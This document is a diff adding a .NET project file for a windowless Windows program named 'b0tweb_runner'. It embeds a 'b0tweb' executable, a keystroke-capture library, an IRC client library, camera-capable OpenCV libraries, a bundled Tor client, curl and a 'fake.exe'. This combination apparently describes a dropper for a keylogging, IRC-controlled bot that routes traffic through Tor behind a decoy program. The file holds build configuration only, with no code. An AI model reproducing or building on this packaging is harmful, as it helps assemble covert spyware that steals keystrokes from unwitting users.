@@ -1,0 +1,84 @@
+﻿<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>WinExe</OutputType>
+    <TargetFramework>netcoreapp3.1</TargetFramework>
+    <RootNamespace>b0tweb_runner</RootNamespace>
+    <ApplicationIcon />
+    <StartupObject />
+  </PropertyGroup>
+
+  <ItemGroup>
+    <None Remove="Faker\fake.exe" />
+    <None Remove="Minecraft.exe" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <EmbeddedResource Include="..\b0tweb\bin\Release\Emgu.CV.UI.xml" Link="b0tweb\Emgu.CV.UI.xml" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\Emgu.CV.World.xml" Link="b0tweb\Emgu.CV.World.xml" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\Meebey.SmartIrc4net.xml" Link="b0tweb\Meebey.SmartIrc4net.xml" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\Newtonsoft.Json.xml" Link="b0tweb\Newtonsoft.Json.xml" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\OpenTK.GLControl.xml" Link="b0tweb\OpenTK.GLControl.xml" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\OpenTK.xml" Link="b0tweb\OpenTK.xml" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\System.ValueTuple.xml" Link="b0tweb\System.ValueTuple.xml" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\ZedGraph.xml" Link="b0tweb\ZedGraph.xml" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <EmbeddedResource Include="Faker\fake.exe" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <Folder Include="b0tweb\" />
+    <Folder Include="Curl\" />
+    <Folder Include="x64\" />
+    <Folder Include="x86\" />
+    <Folder Include="Properties\" />
+    <Folder Include="Tor\" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <EmbeddedResource Include="..\b0tweb\Curl\curl-ca-bundle.crt" Link="Curl\curl-ca-bundle.crt" />
+    <EmbeddedResource Include="..\b0tweb\Curl\curl.exe" Link="Curl\curl.exe" />
+    <EmbeddedResource Include="..\b0tweb\Curl\libcurl-x64.dll" Link="Curl\libcurl-x64.dll" />
+    <EmbeddedResource Include="..\b0tweb\Tor\libcrypto-1_1-x64.dll" Link="Tor\libcrypto-1_1-x64.dll" />
+    <EmbeddedResource Include="..\b0tweb\Tor\libevent-2-1-6.dll" Link="Tor\libevent-2-1-6.dll" />
+    <EmbeddedResource Include="..\b0tweb\Tor\libevent_core-2-1-6.dll" Link="Tor\libevent_core-2-1-6.dll" />
+    <EmbeddedResource Include="..\b0tweb\Tor\libevent_extra-2-1-6.dll" Link="Tor\libevent_extra-2-1-6.dll" />
+    <EmbeddedResource Include="..\b0tweb\Tor\libgcc_s_seh-1.dll" Link="Tor\libgcc_s_seh-1.dll" />
+    <EmbeddedResource Include="..\b0tweb\Tor\libssl-1_1-x64.dll" Link="Tor\libssl-1_1-x64.dll" />
+    <EmbeddedResource Include="..\b0tweb\Tor\libssp-0.dll" Link="Tor\libssp-0.dll" />
+    <EmbeddedResource Include="..\b0tweb\Tor\libwinpthread-1.dll" Link="Tor\libwinpthread-1.dll" />
+    <EmbeddedResource Include="..\b0tweb\Tor\tor.exe" Link="Tor\tor.exe" />
+    <EmbeddedResource Include="..\b0tweb\Tor\zlib1.dll" Link="Tor\zlib1.dll" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <EmbeddedResource Include="..\b0tweb\bin\Release\b0tweb.exe" Link="b0tweb\b0tweb.exe" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\b0tweb.pdb" Link="b0tweb\b0tweb.pdb" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\Emgu.CV.UI.dll" Link="b0tweb\Emgu.CV.UI.dll" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\Emgu.CV.World.dll" Link="b0tweb\Emgu.CV.World.dll" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\KeystrokeAPI.dll" Link="b0tweb\KeystrokeAPI.dll" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\Meebey.SmartIrc4net.dll" Link="b0tweb\Meebey.SmartIrc4net.dll" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\Newtonsoft.Json.dll" Link="b0tweb\Newtonsoft.Json.dll" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\OpenTK.dll" Link="b0tweb\OpenTK.dll" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\OpenTK.GLControl.dll" Link="b0tweb\OpenTK.GLControl.dll" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\System.ValueTuple.dll" Link="b0tweb\System.ValueTuple.dll" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\ZedGraph.dll" Link="b0tweb\ZedGraph.dll" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <EmbeddedResource Include="..\b0tweb\bin\Release\x86\cvextern.dll" Link="x86\cvextern.dll" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\x86\opencv_ffmpeg310.dll" Link="x86\opencv_ffmpeg310.dll" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <EmbeddedResource Include="..\b0tweb\bin\Release\x64\cvextern.dll" Link="x64\cvextern.dll" />
+    <EmbeddedResource Include="..\b0tweb\bin\Release\x64\opencv_ffmpeg310_64.dll" Link="x64\opencv_ffmpeg310_64.dll" />
+  </ItemGroup>
+
+  <ItemGroup>
+    <PackageReference Include="System.Drawing.Common" Version="4.7.0" />
+  </ItemGroup>
+
+</Project>
